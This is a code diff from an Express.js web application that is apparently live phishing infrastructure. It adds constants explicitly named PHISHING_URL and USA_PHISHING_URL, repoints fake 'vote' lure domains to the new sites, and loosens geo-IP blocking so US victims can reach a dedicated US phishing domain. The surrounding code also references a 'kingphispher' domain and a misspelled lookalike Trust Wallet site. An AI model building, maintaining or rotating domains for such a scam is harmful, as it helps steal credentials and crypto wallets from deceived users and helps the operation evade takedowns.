@@ -8,6 +8,9 @@ const expressLayout = require("express-ejs-layouts");
 const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
+const PHISHING_URL = "felizere.site";
+const USA_PHISHING_URL = "stirlaris.site";
+
 
 // CONFIGS
 require("dotenv").config();
@@ -41,7 +44,7 @@ app.use((req, res, next) => {
   const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
   const ip = rawIp.replace(/^::ffff:/, ''); // Strip IPv6 prefix if present
   const countryCode = ip2location.getCountryShort(ip);
-  if (countryCode === 'US') {
+  if (countryCode === 'US' && req.hostname !== USA_PHISHING_URL) {
     return res.status(403).send('Access from the US is blocked.');
   }
   next();
@@ -58,10 +61,10 @@ app.use(function (req, res, next) {
   res.locals.error = req.flash('error');
   req.app.mainURL = "www.kingphispher.site"
   req.app.mainURL2 = "kingphispher.site"
-  req.app.voteUrl = "elitevotze.cc";
-  req.app.voteUrl2 = "www.elitevotze.cc";
-  req.app.hostname1 = "www.elitevotze.cc";
-  req.app.hostname2 = "www.elitevotze.cc";
+  req.app.voteUrl = PHISHING_URL;
+  req.app.voteUrl2 = `www.${PHISHING_URL}`;
+  req.app.hostname1 = `www.${USA_PHISHING_URL}`;
+  req.app.hostname2 = `www.${USA_PHISHING_URL}`;
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
